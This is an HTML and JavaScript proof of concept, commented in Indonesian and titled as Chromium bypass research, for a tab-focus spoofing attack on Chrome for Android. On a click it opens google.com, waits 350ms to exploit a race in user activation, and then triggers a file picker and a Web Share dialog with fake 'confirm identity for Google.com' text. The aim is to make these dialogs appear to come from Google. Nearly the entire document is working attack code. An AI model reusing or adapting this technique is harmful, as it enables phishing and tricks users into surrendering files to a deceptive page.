<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Research - Chromium UI</title>
    <style>
        body { margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; color: #0f0; font-family: monospace; }
        .box { border: 2px solid #0f0; padding: 30px; text-align: center; border-radius: 15px; box-shadow: 0 0 20px #0f0; }
        #start-btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 20px; }
        #fileInput { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>SECURITY AUDIT MODE</h2>
        <p>Klik tombol di bawah untuk simulasi verifikasi tab.</p>
        <button id="start-btn">VERIFIKASI & LANJUTKAN</button>
    </div>

    <input type="file" id="fileInput">

    <script>
        const btn = document.getElementById('start-btn');
        const fileInput = document.getElementById('fileInput');

        // Fungsi pembantu untuk membuat delay berbasis Promise
        const wait = (ms) => new Promise(res => setTimeout(res, ms));

        btn.addEventListener('click', async () => {
            /**
             * TEKNIK: ASYNC GESTURE PERSISTENCE
             * Kita memicu navigasi tab baru, namun kita tetap menahan eksekusi
             * kode di tab ini menggunakan 'await'.
             */
            
            // 1. Buka tab target (Google)
            const target = window.open('https://www.google.com', '_blank');

            // 2. Trik Kritis: Menunggu transisi OS Android selesai (Race Condition)
            // Jeda 250ms - 400ms sering kali adalah jendela di mana Chrome 
            // belum sepenuhnya memutus 'User Activation' dari tab sebelumnya.
            await wait(350);

            try {
                /**
                 * 3. Eksekusi API secara 'pancaran'. 
                 * Kita panggil File Picker tepat saat tab baru sedang fokus.
                 * Jika patch fokus belum sempurna, dialog akan muncul di atas tab Google.
                 */
                fileInput.click();

                // Opsional: Coba tembak Web Share API sekaligus sebagai fallback
                if (navigator.share) {
                    navigator.share({
                        title: 'Required Action',
                        text: 'Konfirmasi identitas untuk Google.com',
                        url: 'https://google.com'
                    }).catch(() => {});
                }

            } catch (e) {
                console.log("Blokir keamanan terdeteksi.");
            }
        });

        fileInput.onchange = (e) => {
            if (e.target.files.length > 0) {
                alert("SPOOF BERHASIL!\nTab latar belakang mendapatkan akses ke: " + e.target.files.name);
            }
        };
    </script>
</body>
</html>
